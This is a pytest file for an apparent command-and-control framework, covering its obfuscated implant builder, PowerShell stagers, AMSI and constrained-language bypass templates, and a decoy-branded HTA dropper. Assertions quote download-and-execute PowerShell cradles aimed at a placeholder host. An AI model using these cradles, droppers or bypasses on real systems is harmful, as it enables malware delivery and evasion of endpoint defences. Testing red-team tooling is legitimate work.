"""Hermetic branch coverage for C2 build and PowerShell rendering helpers."""

from __future__ import annotations

import base64
import json
import subprocess
from pathlib import Path

import pytest
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ed25519, x25519
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

from core.c2 import builder
from core.c2.implants import powershell_stager as stager

pytestmark = [pytest.mark.unit, pytest.mark.security]


def _write_public_key(path: Path, public_key) -> None:
    path.write_bytes(
        public_key.public_bytes(
            serialization.Encoding.PEM,
            serialization.PublicFormat.SubjectPublicKeyInfo,
        )
    )


def test_builder_loads_only_x25519_public_keys(tmp_path) -> None:
    missing = tmp_path / "missing.pem"
    with pytest.raises(FileNotFoundError, match="Start the C2 server first"):
        builder.load_server_pub_key(str(missing))

    wrong = tmp_path / "ed25519.pem"
    _write_public_key(wrong, ed25519.Ed25519PrivateKey.generate().public_key())
    with pytest.raises(ValueError, match="not an X25519 key"):
        builder.load_server_pub_key(str(wrong))

    private_key = x25519.X25519PrivateKey.generate()
    expected = private_key.public_key().public_bytes(
        serialization.Encoding.Raw,
        serialization.PublicFormat.Raw,
    )
    valid = tmp_path / "x25519.pem"
    _write_public_key(valid, private_key.public_key())

    assert base64.b64decode(builder.load_server_pub_key(str(valid))) == expected


def test_builder_encrypts_an_authenticated_round_trip_configuration() -> None:
    blob, hex_key = builder.encrypt_config(
        "https://one.test,https://two.test",
        "pin-one,pin-two",
        "server-public-key",
        "enrollment-token",
    )

    packed = base64.b64decode(blob)
    plaintext = AESGCM(bytes.fromhex(hex_key)).decrypt(packed[:12], packed[12:], None)
    assert json.loads(plaintext) == {
        "urls": "https://one.test,https://two.test",
        "pins": "pin-one,pin-two",
        "pub": "server-public-key",
        "enrollment_token": "enrollment-token",
    }
    assert "SessionKDFContext" in builder._go_linker_flags("blob", "left", "right")


def _prepare_builder(monkeypatch):
    monkeypatch.setattr(builder, "load_server_pub_key", lambda _path: "server-public")
    monkeypatch.setattr(builder, "encrypt_config", lambda *args: ("encrypted", "a" * 64))


def test_build_implant_normalizes_targets_issues_token_and_builds(monkeypatch) -> None:
    _prepare_builder(monkeypatch)
    authority_paths: list[str] = []

    class Authority:
        def __init__(self, path: str) -> None:
            authority_paths.append(path)

        @staticmethod
        def issue() -> str:
            return "issued-token"

    import core.c2.enrollment as enrollment

    monkeypatch.setattr(enrollment, "EnrollmentAuthority", Authority)
    calls: list[tuple[list[str], dict]] = []

    def run(command, **kwargs):
        calls.append((command, kwargs))
        return subprocess.CompletedProcess(command, 0)

    monkeypatch.setattr(builder.subprocess, "run", run)
    output = builder.build_implant(
        "windows",
        "arm64",
        ["https://one.test", "https://two.test"],
        "pin",
    )

    assert output.endswith("data/implant_windows_arm64.exe")
    assert authority_paths[0].endswith("data/keys/enrollment.key")
    assert calls[0][0] == ["go", "mod", "tidy"]
    assert calls[1][0] == ["garble", "version"]
    build_command, build_options = calls[2]
    assert build_command[:4] == ["garble", "-tiny", "-literals", "build"]
    assert "https://one.test,https://two.test" not in " ".join(build_command)
    assert build_options["env"]["GOOS"] == "windows"
    assert build_options["env"]["GOARCH"] == "arm64"

    calls.clear()
    linux_output = builder.build_implant(
        "linux",
        "amd64",
        "https://one.test",
        enrollment_token="supplied-token",
    )
    assert linux_output.endswith("data/implant_linux_amd64")
    assert len(authority_paths) == 1


@pytest.mark.parametrize(
    ("operating_system", "architecture", "message"),
    [
        ("plan9", "amd64", "Unsupported target OS"),
        ("linux", "386", "Unsupported target architecture"),
    ],
)
def test_build_implant_rejects_unsupported_targets(
    operating_system: str,
    architecture: str,
    message: str,
) -> None:
    with pytest.raises(ValueError, match=message):
        builder.build_implant(
            operating_system,
            architecture,
            enrollment_token="supplied",
        )


def test_build_implant_reports_dependency_and_compiler_failures(monkeypatch, capsys) -> None:
    _prepare_builder(monkeypatch)

    def tidy_failure(command, **_kwargs):
        raise subprocess.CalledProcessError(1, command, stderr=b"module failure")

    monkeypatch.setattr(builder.subprocess, "run", tidy_failure)
    with pytest.raises(SystemExit) as tidy_exit:
        builder.build_implant(enrollment_token="supplied")
    assert tidy_exit.value.code == 1
    assert "module failure" in capsys.readouterr().out

    attempts = 0

    def missing_garble(command, **_kwargs):
        nonlocal attempts
        attempts += 1
        if attempts == 2:
            raise FileNotFoundError("garble")
        return subprocess.CompletedProcess(command, 0)

    monkeypatch.setattr(builder.subprocess, "run", missing_garble)
    with pytest.raises(SystemExit) as garble_exit:
        builder.build_implant(enrollment_token="supplied")
    assert garble_exit.value.code == 1
    assert "garble' is not installed" in capsys.readouterr().out

    attempts = 0

    def failed_build(command, **_kwargs):
        nonlocal attempts
        attempts += 1
        if attempts == 3:
            raise subprocess.CalledProcessError(2, command)
        return subprocess.CompletedProcess(command, 0)

    monkeypatch.setattr(builder.subprocess, "run", failed_build)
    with pytest.raises(RuntimeError, match="Go implant build failed"):
        builder.build_implant(enrollment_token="supplied")


@pytest.mark.parametrize(
    ("method", "needle"),
    [
        ("IEX", "DownloadString"),
        ("iwr", "Invoke-WebRequest"),
        ("xml", "XmlDocument"),
        ("bits", "Start-BitsTransfer"),
        ("wscript", "WScript.Shell"),
    ],
)
def test_each_powershell_stager_method_renders_its_expected_boundary(
    monkeypatch,
    method: str,
    needle: str,
) -> None:
    monkeypatch.setattr(stager, "_split_url_for_obfuscation", lambda _url: ["https://", "host/payload"])
    monkeypatch.setattr(stager, "_rand_var", lambda: "variable")
    monkeypatch.setattr(stager.secrets, "token_hex", lambda _length: "deadbeef")

    rendered = stager.generate_ps_stager("https://host/payload", method)

    assert rendered.startswith("powershell ")
    assert needle in rendered
    assert "'https://'+'host/payload'" in rendered


def test_powershell_stager_rejects_unknown_method() -> None:
    with pytest.raises(ValueError, match="Unsupported stager method: unknown"):
        stager.generate_ps_stager("https://host/payload", "unknown")


def test_encoded_stager_round_trips_the_inner_script(monkeypatch) -> None:
    monkeypatch.setattr(stager, "_rand_var", lambda: "client")
    rendered = stager.generate_ps_encoded("https://host/payload.ps1")
    encoded = rendered.rsplit(" ", 1)[-1]

    assert base64.b64decode(encoded).decode("utf-16-le") == (
        "$client=New-Object Net.WebClient;IEX($client.DownloadString('https://host/payload.ps1'))"
    )


@pytest.mark.parametrize(
    ("technique", "needle"),
    [
        ("reflection", "Reflection Method"),
        ("patch", "Memory Patch"),
        ("initfailed", "InitFailed"),
    ],
)
def test_all_amsi_templates_are_renderable(monkeypatch, technique: str, needle: str) -> None:
    monkeypatch.setattr(stager.random, "choice", lambda _items: technique)
    monkeypatch.setattr(stager, "_rand_var", lambda: "variable")
    monkeypatch.setattr(stager.secrets, "token_hex", lambda _length: "cafebabe")

    assert needle in stager.generate_ps_amsi_bypass()


@pytest.mark.parametrize(
    ("technique", "needle"),
    [
        ("runspace", "Custom Runspace"),
        ("installutil", "InstallUtil"),
        ("msbuild", "MSBuild Inline Task"),
    ],
)
def test_all_clm_templates_are_renderable(monkeypatch, technique: str, needle: str) -> None:
    monkeypatch.setattr(stager.random, "choice", lambda _items: technique)
    monkeypatch.setattr(stager, "_rand_var", lambda: "variable")
    monkeypatch.setattr(stager.secrets, "token_hex", lambda _length: "cafebabe")

    assert needle in stager.generate_ps_clm_bypass()


def test_hta_dropper_contains_encoded_payload_and_randomized_decoy(monkeypatch, caplog) -> None:
    monkeypatch.setattr(stager, "_rand_var_vbs", lambda: "variable")
    monkeypatch.setattr(stager.random, "choice", lambda items: items[0])
    monkeypatch.setattr(stager.secrets, "token_hex", lambda _length: "a1b2c3d4")

    with caplog.at_level("INFO"):
        rendered = stager.generate_hta_dropper("https://host/payload.ps1")

    assert "Microsoft Office Update" in rendered
    assert "A1B2C3D4" in rendered
    encoded = rendered.split("-EncodedCommand ", 1)[1].split('"', 1)[0]
    assert base64.b64decode(encoded).decode("utf-16-le") == (
        "IEX(New-Object Net.WebClient).DownloadString('https://host/payload.ps1')"
    )
    assert "Generated HTA dropper" in caplog.text


def test_random_name_and_url_helpers_cover_empty_and_chunked_inputs(monkeypatch) -> None:
    monkeypatch.setattr(stager.random, "randint", lambda minimum, maximum: minimum)
    monkeypatch.setattr(stager.random, "choice", lambda _alphabet: "a")
    monkeypatch.setattr(stager.random, "choices", lambda _alphabet, *, k: ["b"] * k)

    assert stager._rand_var(3, 8) == "abb"
    assert stager._rand_var_vbs(4, 8) == "abbb"
    assert stager._split_url_for_obfuscation("") == []
    assert stager._split_url_for_obfuscation("abcdefgh") == ["abc", "def", "gh"]
